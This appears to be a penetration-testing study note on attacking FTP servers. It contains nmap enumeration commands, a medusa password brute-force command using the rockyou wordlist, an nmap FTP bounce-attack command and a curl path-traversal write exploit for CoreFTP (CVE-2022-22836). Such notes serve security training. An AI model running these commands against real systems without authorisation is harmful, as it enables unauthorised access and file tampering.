### Basics
- FTP listens on port `TCP/21`

### Enumeration
``` bash
sudo nmap -sC -sV -p 21 <IP>

ftp <ip> [<port>]
```

### Misconfigurations
- Anonymous access is dangerous
- There may be sensitive information accessable
- We may be able to upload scripts and execute them

## Protocol Specific Attacks

### Brute Forcing
- Can be done via hydra or [medusa](https://github.com/jmk-foofus/medusa)
- Most applications prevent this kind of attack.
	- Password Spraying is more effective
``` bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -M ftp -h <IP>  
```

### FTP Bounce Attack
- We can route connections through the ftp server to hosts that we dont have direct access to outside the network.
- [What is an ftp bounce attack?](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/) ![[Pasted image 20230331171454.png|700]]
- The nmap `-b` flag can be used to perform the bounce attack
``` bash
nmap -Pn -v -n -p80 -b anonymous:password@<ftpIP> <targetIP>
```

## Latest Vulnerabilities
- **CoreFTP < build 727**
- Â [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)
- Authenticated Path traversal/arbitrary write vulnerability

#### Concept of Attack
- CoreFTP uses a HTTP `POST` request to upload files. However the service allows an HTTP `PUT` request which we can use to write content to files.
- The [exploit](https://www.exploit-db.com/exploits/50652) is based on a single cURL command
``` bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "payload" --path-as-is https://<IP>/../../../../../../whoops
```